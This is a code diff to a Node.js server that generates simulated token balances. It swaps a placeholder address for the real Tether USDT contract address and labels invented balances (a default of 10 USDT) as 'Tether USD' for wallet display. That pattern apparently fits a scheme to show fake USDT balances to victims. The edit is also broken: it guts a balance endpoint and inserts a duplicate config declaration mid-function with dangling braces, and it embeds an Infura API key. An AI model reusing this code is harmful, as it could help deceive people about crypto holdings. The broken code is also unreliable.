@@ -17,7 +17,7 @@ const port = process.env.PORT || 3000;
 // TOKEN CONFIGURATION - ETHEREUM FOCUSED (ENHANCED)
 // =========================================================
 const TOKEN_CONFIG = {
-  address: '0x000000000000000000000000000000000000dEaD',  // Simulated Ethereum address
+  address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',  // Simulated Ethereum address
   displaySymbol: 'USDT', // Display symbol for UI and wallet
   displayName: 'Tether USD', // Display name for UI and wallet
   decimals: 6,  // 6 decimals is standard for USDT
@@ -379,27 +379,19 @@ function generateDeterministicBalance(address) {
   }
 }
 
-// Enhanced token balance endpoint with improved error handling
-app.get('/api/token-balance/:address', async (req, res) => {
-  try {
-    const { address } = req.params;
-    
-    // Basic validation
-    if (!address || address.length !== 42 || !address.startsWith('0x')) {
-      return res.status(200).json({ 
-        address: address || "0x0000000000000000000000000000000000000000",
-        token: TOKEN_CONFIG.address,
-        tokenSymbol: TOKEN_CONFIG.displaySymbol,
-        rawBalance: "10000000", // Default 10 USDT with 6 decimals
-        formattedBalance: "10.00",
-        valueUSD: "10.00",
-        tokenDecimals: TOKEN_CONFIG.decimals,
-        chainId: TOKEN_CONFIG.chainId,
-        networkId: TOKEN_CONFIG.networkId,
-        networkName: TOKEN_CONFIG.networkName,
-        isNative: TOKEN_CONFIG.isNative,
-        error: false
-      });
+const TOKEN_CONFIG = {
+  address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',  // Real USDT address on Ethereum
+  displaySymbol: 'USDT', 
+  displayName: 'Tether USD',
+  decimals: 6,  // USDT on Ethereum has 6 decimals
+  image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
+  networkName: 'Ethereum',
+  networkId: '0x1',
+  rpcUrl: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
+  blockExplorerUrl: 'https://etherscan.io',
+  coinGeckoId: 'tether',
+  coinMarketCapId: '825'
+};
     }
     
     // Generate balance with fallback
